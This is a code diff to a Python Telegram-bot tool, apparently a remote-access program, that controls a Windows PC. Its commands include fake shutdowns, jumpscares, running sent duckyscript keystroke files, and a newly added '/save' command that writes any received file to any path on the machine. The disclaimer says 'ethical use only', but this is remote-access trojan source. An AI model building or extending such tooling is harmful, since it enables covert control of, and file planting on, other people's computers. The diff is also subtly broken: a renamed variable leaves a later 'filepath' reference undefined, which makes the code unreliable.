@@ -1,3 +1,13 @@
+"""
+WARNINGS:
+This code is meant only to run on Windows 10/11 (7 and 8 probably work as well), the original project was to make it cross platform but then I realized it was too much work, sorry Linux.
+This code is NOT meant to be used without the owner's consent, it is meant for ethical use only, I am not responsable for any illegal use of this program.
+If you lose control of your telegram bot, you could potentially lose the control of t YOUR OWN MACHINE.
+
+~Riccardo Zappitelli
+"""
+
+
 #TELEGRAM
 import requests
 from telepot import Bot, glance
@@ -53,7 +63,7 @@ from random import choice, randint
 from webbrowser import open as browseropen
 from string import ascii_letters, printable
 from subprocess import CREATE_NO_WINDOW, PIPE, Popen
-from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod 
+from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod, rename
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
 from os.path import join, abspath, isfile, exists, dirname, realpath, isdir, split as pathsplit, getsize
 
@@ -201,7 +211,7 @@ else:
     FACERECOGNITION = False
 
 
-DUCKYHELP = """DELAY [time] – Adds a delay in milliseconds (e.g., DELAY 1000 waits 1 second).
+DUCKYHELP = r"""DELAY [time] – Adds a delay in milliseconds (e.g., DELAY 1000 waits 1 second).
 REM [comment] – Adds a comment (e.g., REM This is a comment).
 STRING [text] – Types a string of characters (e.g., STRING Hello World).
 ENTER – Presses the Enter key.
@@ -223,7 +233,7 @@ END – Presses the End key.
 PAGEUP – Presses Page Up.
 PAGEDOWN – Presses Page Down."""
 
-HELP = """🛑 System & Shutdown
+HELP = r"""🛑 System & Shutdown
 shutdown - Shut down the PC.
 fakeshutdown - Fake system shutdown.
 altf4 - Simulate Alt + F4.
@@ -310,10 +320,16 @@ browser - Open URL in browser.
 
 📎 File Input Commands
 *sending a photo* - Displays the photo on the screen as a pop-up.
+
 *sending a photo with "/jumpscare" caption* - Will create a jumpscare with that photo.
+
 *sending a video with /setvideowallpaper as caption will play it as wallpaper(dont use long videos).
+
 *sending an audio/voice* - Will play the audio/voice in the background.
+
 *sending a file that ends with '.dd' - will execute it as duckyscript. (send /duckyhelp to get commands)
+
+*sending a file with /save and the path will save that file in that path, no matter the extension. (example *photo* /save C:\Users\YOURUSER\Photo\*
 
 📚 Multi-Command
 You can run multiple commands at the same time by sending them in the same message but separated by a comma.
@@ -1057,7 +1073,7 @@ class PeppinoTelegram:
         self.cantopenlist = []
         self.processmonitorlist = {} 
         self.duckyhelp = DUCKYHELP
-        self.explorer_path = getcwd()
+        self.explorer_path = getcwd() # For now I'm not forward to make a file explorer
         self.audio_mixer = mixer
         self.running = True
         self.message_timeout = 5
@@ -1584,6 +1600,22 @@ class PeppinoTelegram:
                     change_wallpaper(abspath("tmp.png"))
                 remove("tmp.png")
                 self.restore_wallpaper()
+            
+            elif caption.startswith("/save"):
+                try:
+                    args = caption.split()
+                    if len(args)>1:
+                        filepath = " ".join(caption.split()[1:])
+                        containts_filename = "." in pathsplit(filepath)[-1]
+                        if containts_filename:
+                            rename(saved_filepath, filepath)
+                        else:
+                            rename(saved_filepath, join(filepath, saved_filename+".mp4"))
+                        self.bsend(f"{emoji_dict['file']} File saved successfully.")
+                        return
+                except Exception as e:
+                    self.bsend(f"{emoji_dict['file']} Could not save the file. {e}")
+                    return
 
         elif mimetype == "video_note":
             cap = VideoCapture(saved_filepath)
@@ -1599,12 +1631,30 @@ class PeppinoTelegram:
 
     def parse_photo(self, msg: dict) -> None:
         filename = randompngname()
-        filepath = join(BURN_DIRECTORY, filename)
-        self.bot.download_file(msg['photo'][-1]['file_id'], filepath)
+        saved_filepath = join(BURN_DIRECTORY, filename)
+        self.bot.download_file(msg['photo'][-1]['file_id'], saved_filepath)
         if "caption" in msg.keys():
-            if msg["caption"] == "/jumpscare":
-                self.jumpscare(filepath)
+            caption = msg["caption"]
+            if caption == "/jumpscare":
+                self.jumpscare(saved_filepath)
                 return
+
+            elif caption.startswith("/save"):
+                try:
+                    args = caption.split()
+                    if len(args)>1:
+                        filepath = " ".join(caption.split()[1:])
+                        containts_filename = "." in pathsplit(filepath)[-1]
+                        if containts_filename:
+                            rename(saved_filepath, filepath)
+                        else:
+                            rename(saved_filepath, join(filepath, filename))
+                        self.bsend(f"{emoji_dict['file']} File saved successfully.")
+                        return
+                except Exception as e:
+                    self.bsend(f"{emoji_dict['file']} Could not save the file. {e}")
+                    return
+
         Thread(target=self.show_image, args=[filepath,]).start()
         sleep(0.5)
         remove(filepath)
